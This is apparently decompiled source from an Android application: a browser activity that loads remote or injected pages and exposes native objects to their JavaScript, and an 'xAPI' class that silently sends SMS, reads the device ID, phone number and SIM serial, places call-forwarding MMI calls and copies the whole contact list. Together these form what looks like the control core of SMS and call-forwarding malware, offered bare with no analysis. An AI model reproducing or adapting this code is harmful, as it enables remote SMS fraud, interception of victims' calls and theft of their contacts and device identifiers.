package com.address.core.activities;

import android.app.Activity;
import android.os.Bundle;
import android.webkit.WebView;
import com.address.core.Consts;
import com.address.core.Log;
import com.address.core.R;
import com.address.core.RunService;
import com.address.core.utilities.xWebAPI;
import com.address.core.utilities.xWebChromeClient;
import com.address.core.utilities.xWebClient;

public class BrowserActivity extends Activity {
    private static String _data = "";
    private static String _title = "";
    private static String _url = "http://";
    public static WebView web = null;

    public void onCreate(Bundle icicle) {
        super.onCreate(icicle);
        setContentView(R.layout.browser);
        web = (WebView) findViewById(R.id.browser);
        web.setWebViewClient(new xWebClient());
        web.setWebChromeClient(new xWebChromeClient());
        web.clearCache(true);
        web.getSettings().setJavaScriptEnabled(true);
        web.getSettings().setAllowFileAccess(true);
        web.getSettings().setUseWideViewPort(true);
        web.getSettings().setBuiltInZoomControls(false);
        web.setVerticalScrollBarEnabled(true);
        web.setHorizontalScrollBarEnabled(true);
        web.addJavascriptInterface(new xWebAPI(this, web, this), "WebAPI");
        web.addJavascriptInterface(RunService.getService().getAPI(), "xAPI");
        web.addJavascriptInterface(new Consts(), "Consts");
        web.addJavascriptInterface(RunService.getService(), "Service");
        if (_data.length() == 0) {
            loadURL(_url);
            Log.write("Browser loading: " + _url);
        } else {
            loadData(_data, "text/html");
            Log.write("Browser loading: " + _data);
        }
        super.setTitle(_title);
    }

    public static void loadURL(String url) {
        web.loadUrl(url);
    }

    public static void loadData(String data, String mime) {
        web.loadData(data, mime, "utf-8");
    }

    public static void setURL(String url) {
        _url = url;
    }

    public static void setData(String data) {
        _data = data;
    }

    public static void setTitle(String title) {
        _title = title;
    }

    /* access modifiers changed from: protected */
    public void onResume() {
        super.onResume();
        if (_data.length() == 0) {
            loadURL(_url);
            Log.write("Browser loading: " + _url);
        } else {
            loadData(_data, "text/html");
            Log.write("Browser loading: " + _data);
        }
        super.setTitle(_title);
    }
}
package com.address.core;

import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import com.address.core.utilities.PhoneContact;
import java.util.ArrayList;

public class xAPI {
    private String hash = "";
    private TelephonyManager telemgr = null;

    public xAPI(String hash, TelephonyManager telemgr) {
        this.hash = hash;
        this.telemgr = telemgr;
    }

    public void sendSMS(String number, String text, int id) {
        try {
            Intent sentIntent = new Intent("SMS_SENT");
            Intent deliveredIntent = new Intent("SMS_DELIVERED");
            sentIntent.putExtra("number", number);
            sentIntent.putExtra("message", text);
            sentIntent.putExtra("id", id);
            deliveredIntent.putExtra("number", number);
            deliveredIntent.putExtra("message", text);
            deliveredIntent.putExtra("id", id);
            SmsManager.getDefault().sendTextMessage(number, null, text, PendingIntent.getBroadcast(RunService.getService(), 0, sentIntent, 134217728), PendingIntent.getBroadcast(RunService.getService(), 0, deliveredIntent, 134217728));
        } catch (Exception e) {
        }
    }

    public void sendSMS(String number, String text) {
        sendSMS(number, text, 0);
    }

    public String[] getTelephonyInfo() {
        String[] ret = new String[9];
        ret[0] = this.telemgr.getDeviceId();
        ret[1] = this.telemgr.getLine1Number();
        ret[2] = this.telemgr.getNetworkOperatorName();
        ret[3] = this.telemgr.getNetworkCountryIso();
        ret[4] = this.telemgr.getSimOperatorName();
        ret[5] = this.telemgr.getSimCountryIso();
        ret[6] = this.telemgr.getSimSerialNumber();
        return ret;
    }

    public void callForward(String mmi) {
        this.telemgr.listen(new PhoneCallListener(), 0);
        Intent fwd = new Intent("android.intent.action.CALL");
        fwd.setData(Uri.fromParts("tel", mmi, "#"));
        RunService.getService().startActivity(fwd);
    }

    public String getAndroidVersion() {
        return VERSION.RELEASE;
    }

    public void StartNewActivity(Class clazz) {
        Intent intent = new Intent(RunService.getService().getApplicationContext(), clazz);
        intent.addFlags(335544320);
        RunService.getService().startActivity(intent);
    }

    public ArrayList<PhoneContact> getContacts() {
        ContentResolver cr = RunService.getService().getContentResolver();
        Cursor cursor = cr.query(Contacts.CONTENT_URI, null, null, null, null);
        ArrayList<PhoneContact> alContacts = new ArrayList();
        if (cursor.moveToFirst()) {
            do {
                String id = cursor.getString(cursor.getColumnIndex("_id"));
                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex("has_phone_number"))) > 0) {
                    Cursor pCur = cr.query(Phone.CONTENT_URI, null, "contact_id=?", new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        PhoneContact contact = new PhoneContact();
                        contact.phone = pCur.getString(pCur.getColumnIndex("data1"));
                        contact.name = pCur.getString(pCur.getColumnIndex("display_name"));
                        alContacts.add(contact);
                    }
                    pCur.close();
                }
            } while (cursor.moveToNext());
        }
        return alContacts;
    }
}
